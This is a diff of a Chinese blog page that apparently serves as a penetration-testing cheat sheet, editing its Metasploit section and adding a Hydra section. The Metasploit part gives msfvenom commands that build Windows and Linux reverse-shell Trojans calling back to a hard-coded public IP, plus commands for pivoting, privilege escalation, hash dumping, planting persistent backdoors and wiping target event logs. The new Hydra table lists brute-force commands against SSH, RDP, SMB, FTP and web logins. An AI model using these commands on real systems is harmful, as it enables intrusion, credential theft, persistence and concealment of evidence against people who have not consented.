@@ -450,28 +450,27 @@
 <p>参考文档:<a href="https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap" target="_blank" rel="noopener">https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html深度剖析了nmap</a></p>
 <h3 id="四-MSF"><a href="#四-MSF" class="headerlink" title="四.MSF"></a>四.MSF</h3><p>​    </p>
 <ul>
-<li><p>1.生成windows下的反弹木马</p>
-<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe
-// -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt;
+<li><p>1.生成windows下的exe反弹木马<br>  msfvenom -p windows/meterpreter/reverse_tcp LHOST=60.205.212.140 LPORT=8888 -f exe &gt; 8888.exe</p>
+<pre><code>// -p &lt; payload &gt; -f &lt; format&gt; -o &lt; path&gt; = &gt;
 </code></pre></li>
-<li><p>2.监听</p>
-<pre><code>use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
+<li><p>生成linux的反弹elf木马</p>
+<p>  msf5 &gt; use payload/linux/x64/meterpreter/reverse_tcp<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lhost 192.168.5.187<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; set lport 20000<br>  msf5 payload(linux/x64/meterpreter/reverse_tcp) &gt; generate -h<br>  generate -f elf -o ~/Desktop/centos.elf</p>
+</li>
+<li><p>2.监听<br>  use exploit/multi/handler</p>
+<pre><code>set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 172.17.150.246 //阿里云云服务器这里是内网ip
 set LPORT 8888
 exploit -j
 </code></pre></li>
-<li><p>3.内网代理    首先需要链接sessions,在此基础下添加路由</p>
-<pre><code>meterpreter &gt; run get_local_subnets //获取网段
-meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由
+<li><p>3.内网代理    首先需要链接sessions,在此基础下添加路由<br>  meterpreter &gt; run get_local_subnets //获取网段</p>
+<pre><code>meterpreter &gt; run autoroute -s 172.2.175.0/24 //添加路由
 meterpreter &gt; run autoroute -p //查看路由
 meterpreter &gt; run autoroute -d -s 172.2.175.0 //删除网段
 meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24 //探测该网段下的存活主机。
 meterpreter &gt; background //后台sessions
 </code></pre></li>
-<li><p>4.提权</p>
-<pre><code>(1)getsystem
-meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法
+<li><p>4.提权<br>  (1)getsystem</p>
+<pre><code>meterpreter &gt; getsystem //直getsystem提权，最常用简单的办法
 (2)使用exp提权
 meterpreter &gt; background //先后台运行会话
 [*] Backgrounding session 1…
@@ -494,9 +493,8 @@ msf &gt; run //成功后会返回一个新的session，进入新会话，发现�
 (5)Hash
 meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法最智能，效果最好。
 </code></pre></li>
-<li><p>5.留后门</p>
-<pre><code>(1)服务留后门：
-    meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole
+<li><p>5.留后门<br>(1)服务留后门：</p>
+<pre><code>    meterpreter &gt; run metsvc -A //再开起一个终端，进入msfconsole
     msf &gt; use exploit/multi/handler //新终端中监听
     msf &gt; set payload windows/metsvc_bind_tcp
     msf &gt; set LPORT 31337
@@ -508,21 +506,18 @@ meterpreter &gt; run post/windows/gather/smart_hashdump //读取hash这种做法
 <p>​        <code>注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。
 ​        缺点：容易被杀毒软件杀 。</code></p>
 </li>
-<li><p>6.爆破ssh</p>
-<pre><code>use auxiliary/scanner/ssh/ssh_login
-set rhosts 7.7.7.20
+<li><p>6.爆破ssh<br> use auxiliary/scanner/ssh/ssh_login</p>
+<pre><code>set rhosts 7.7.7.20
 set username root
 set pass_file /root/pass.txt //加载字典，可以收集密码做字典
 set threads 50
 run
 </code></pre></li>
-<li><p>7.nmap扫描基本信息</p>
-<pre><code>msf &gt; nmap –script=vuln 受害靶机ip地址
-msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..
+<li><p>7.nmap扫描基本信息<br> msf &gt; nmap –script=vuln 受害靶机ip地址</p>
+<pre><code>msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版本 等..
 </code></pre></li>
-<li><p>8.清除记录</p>
-<pre><code>msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。
-</code></pre></li>
+<li><p>8.清除记录<br> msf &gt; clearev //删除目标机上的应用程序、系统和安全日志。</p>
+</li>
 </ul>
 <p>  MSF常用命令：</p>
 <table>
@@ -560,11 +555,136 @@ msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版�
 </tbody>
 </table>
 <p>msf部分取自：<a href="http://www.cnblogs.com/hookjoy/p/7989715.html" target="_blank" rel="noopener">http://www.cnblogs.com/hookjoy/p/7989715.html</a>        </p>
+<h3 id="五Hydra"><a href="#五Hydra" class="headerlink" title="五Hydra"></a>五Hydra</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-R</td>
+<td>根据上一次进度继续破解</td>
+</tr>
+<tr>
+<td>-S</td>
+<td>使用SSL协议连接</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>指定端口</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>指定用户名</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>指定用户名字典(文件)</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>指定密码破解</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>指定密码字典(文件)</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>空密码探测和指定用户密码探测(ns)</td>
+</tr>
+<tr>
+<td>-C</td>
+<td>用户名可以用:分割(username:password)可以代替-l username -p password</td>
+</tr>
+<tr>
+<td>-o</td>
+<td>输出文件</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>指定多线程数量，默认为16个线程</td>
+</tr>
+<tr>
+<td>-vV</td>
+<td>显示详细过程</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>一旦破解成功就停止</td>
+</tr>
+</tbody>
+</table>
+<p>实例：</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>实例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>破解ssh的密码</td>
+<td>hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</td>
+</tr>
+<tr>
+<td>破解https</td>
+<td>hydra -m /index.php -l username -P pass.txt IP https</td>
+</tr>
+<tr>
+<td>破解smb</td>
+<td>hydra -l administrator -P pass.txt IP smb</td>
+</tr>
+<tr>
+<td>破解rdp</td>
+<td>hydra IP rdp -l administrator -P pass.txt -V</td>
+</tr>
+<tr>
+<td>破解http-proxy</td>
+<td>hydra -l admin -P pass.txt http-proxy://10.36.16.18</td>
+</tr>
+<tr>
+<td>破解telnet</td>
+<td>hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</td>
+</tr>
+<tr>
+<td>破解ftp1</td>
+<td>hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</td>
+</tr>
+<tr>
+<td>破解ftp2</td>
+<td>hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV</td>
+</tr>
+<tr>
+<td>get方式提交，破解web登录1</td>
+<td>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/</td>
+</tr>
+<tr>
+<td>get方式提交，破解web登录2</td>
+<td>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php`</td>
+</tr>
+<tr>
+<td>post方式提交，破解web登录1</td>
+<td>hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form</td>
+</tr>
+<tr>
+<td>post方式提交，破解web登录2</td>
+<td>index.php:name=^USER^&amp;pwd=^PASS^:<code>&lt;title&gt;invalido&lt;/title&gt;</code></td>
+</tr>
+</tbody>
+</table>
 
                 <hr>
                 
 
                 <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/03/24/域渗透/" data-toggle="tooltip" data-placement="top" title="域渗透">&larr; Previous Post</a>
+                    </li>
                     
                     
                     <li class="next">
@@ -587,7 +707,7 @@ msf &gt; nmap –script=mysql-info 192.168.0.4 //扫描mysql数据库信息 版�
 
             <div class="hidden-xs col-sm-3 toc-col">
                 <div class="toc-wrap">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web测试常用工具整理"><span class="toc-text">web测试常用工具整理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一-burpsuite"><span class="toc-text">一.burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-sqlmap参数"><span class="toc-text">二.sqlmap参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-nmap"><span class="toc-text">三.nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四-MSF"><span class="toc-text">四.MSF</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web测试常用工具整理"><span class="toc-text">web测试常用工具整理:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一-burpsuite"><span class="toc-text">一.burpsuite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二-sqlmap参数"><span class="toc-text">二.sqlmap参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三-nmap"><span class="toc-text">三.nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四-MSF"><span class="toc-text">四.MSF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五Hydra"><span class="toc-text">五Hydra</span></a></li></ol>
                 </div>
             </div>
         </div>
